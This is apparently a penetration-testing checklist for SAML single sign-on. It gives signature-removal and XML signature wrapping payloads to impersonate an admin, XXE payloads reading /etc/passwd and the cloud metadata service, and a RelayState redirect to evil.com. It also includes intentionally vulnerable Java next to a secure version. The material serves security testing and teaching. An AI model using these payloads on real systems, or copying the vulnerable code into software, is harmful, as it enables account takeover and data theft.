tactic: Initial Access

**SAML** is an XML-based open standard for exchanging authentication and authorization data between an **Identity Provider (IdP)** and a **Service Provider (SP)**. It's widely used for SSO in enterprise environments. Because it's XML-based, it inherits XML vulnerabilities on top of its own implementation flaws.

```
1. User visits SP (e.g. company app)
2. SP redirects to IdP with a SAML AuthnRequest
3. User authenticates at IdP
4. IdP returns a signed SAML Response (XML) to the SP via browser POST
5. SP validates the signature → grants access based on assertions
```

Key concepts:

|Term|What it means|
|---|---|
|Identity Provider (IdP)|The auth server — issues assertions (e.g. Okta, ADFS, Keycloak)|
|Service Provider (SP)|The app relying on the IdP for auth|
|Assertion|XML statement about the user (who they are, their roles)|
|SAMLResponse|Base64-encoded signed XML sent from IdP to SP|
|NameID|The user identifier inside the assertion (email, username)|
|ACS URL|Assertion Consumer Service — where the SP receives the SAMLResponse|
|Binding|How SAML messages are transported (HTTP-POST, HTTP-Redirect)|

---

## Injection Points

- `SAMLResponse` parameter in POST to `/saml/acs` or `/sso/saml`
- `NameID` value inside the assertion
- XML signature validation logic (wrapping attacks)
- `RelayState` parameter (open redirect)
- XML parser (XXE via DOCTYPE in SAML XML)
- IdP metadata endpoint if user-supplied

---

## Checklist

### Recon

- [ ]  Find the SAML endpoints:

```
	/saml/acs
	/sso/saml
	/saml/metadata
	/auth/saml
	/Shibboleth.sso/SAML2/POST
```

- [ ]  Capture a `SAMLResponse`  base64 decode and inspect the XML:

bash

```bash
	echo "BASE64_RESPONSE" | base64 -d | xmllint --format -
```

- [ ]  Note the `NameID`, signature algorithm, and assertion attributes

### Signature Bypass

- [ ]  **Remove the signature entirely**  does the SP still accept the response?
- [ ]  **Comment out the signature block** in the XML  some parsers ignore it:

```xml
	<!-- <ds:Signature>...</ds:Signature> -->
```

- [ ]  **Change `NameID`** to admin/target user after removing signature

### XML Signature Wrapping (XSW)

- [ ]  The SP validates the signed element but uses a different (unsigned) copy  duplicate the assertion:

```xml
	<!-- Signed assertion with original values stays here for validation -->
	<saml:Assertion ID="signed">...</saml:Assertion>

	<!-- Unsigned assertion with attacker values — SP uses this one -->
	<saml:Assertion ID="evil">
	    <saml:NameID>admin@company.com</saml:NameID>
	</saml:Assertion>
```

- [ ]  Try multiple XSW variants — move the evil assertion before/after/inside the signed one

### XXE via SAML

- [ ]  Inject XXE payload inside the SAMLResponse XML:

```xml
	<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
	<samlp:Response>
	    <saml:Issuer>&xxe;</saml:Issuer>
	    ...
	</samlp:Response>
```

### NameID Manipulation

- [ ]  After confirming signature is not validated — change `NameID` to another user:
```xml
	<saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">
	    admin@company.com
	</saml:NameID>
```

### RelayState Open Redirect

- [ ]  Check if `RelayState` param in the SAML flow redirects without validation:

```
	RelayState=https://evil.com
```

### SAML Response Replay

- [ ]  Capture a valid `SAMLResponse` and replay it — is there replay protection (`InResponseTo`, timestamp)?

---

## Attack Payloads

**Base64 decode → modify → re-encode workflow:**


```bash
# Decode
echo "SAML_RESPONSE_BASE64" | base64 -d > saml.xml

# Edit saml.xml — remove signature, change NameID

# Re-encode
cat saml.xml | base64 -w 0
# Submit modified value in SAMLResponse param
```

**XXE inside SAMLResponse:**


```xml
<?xml version="1.0"?>
<!DOCTYPE samlp:Response [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<samlp:Response>
  <saml:Assertion>
    <saml:NameID>&xxe;</saml:NameID>
  </saml:Assertion>
</samlp:Response>
```

---

## White Box Testing

**Vulnerable — signature not validated, NameID trusted directly:**

```java
@PostMapping("/saml/acs")
public ResponseEntity<?> assertionConsumer(@RequestParam String SAMLResponse) {
    String decoded = new String(Base64.decode(SAMLResponse));
    Document doc = parseXml(decoded);

    // ← no signature validation at all
    String nameId = doc.getElementsByTagName("NameID").item(0).getTextContent();

    User user = userRepository.findByEmail(nameId); // ← trusts attacker-controlled value
    loginUser(user);
    return ResponseEntity.ok().build();
}
```

**Vulnerable — XML parser allows XXE:**

```java
public Document parseXml(String xml) throws Exception {
    DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
    // ← XXE not disabled — external entities will be resolved
    DocumentBuilder builder = factory.newDocumentBuilder();
    return builder.parse(new InputSource(new StringReader(xml)));
}
```

**Vulnerable — XSW, validates signed node but reads from a different node:**

```java
// Validates signature on element with ID "signed"
boolean valid = validateSignature(doc, "signed");

if (valid) {
    // ← reads NameID from first occurrence — attacker placed unsigned one first
    String nameId = doc.getElementsByTagName("NameID").item(0).getTextContent();
    loginUser(nameId);
}
```

**Secure:**

```java
// Use a well-maintained SAML library — never parse manually
// Spring Security SAML2 handles signature validation correctly

@Bean
public RelyingPartyRegistrationRepository registrations() {
    RelyingPartyRegistration registration = RelyingPartyRegistrations
        .fromMetadataLocation("https://idp.example.com/saml/metadata")
        .registrationId("my-idp")
        .build();
    return new InMemoryRelyingPartyRegistrationRepository(registration);
}

// Disable XXE in XML parser
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
factory.setExpandEntityReferences(false);

// Always read NameID from the validated/signed assertion node — not getElementsByTagName
```

---

## Resources

- [PortSwigger SAML](https://portswigger.net/burp/documentation/dast/user-guide/users-and-permissions/sso/saml)
- [HackTricks SAML vulns]([https://book.hacktricks.xyz/pentesting-web/saml-attacks](https://hacktricks.wiki/en/pentesting-web/registration-vulnerabilities.html#saml-vulnerabilities))
- [SAML Raider — Burp Extension](https://github.com/CompassSecurity/SAMLRaider)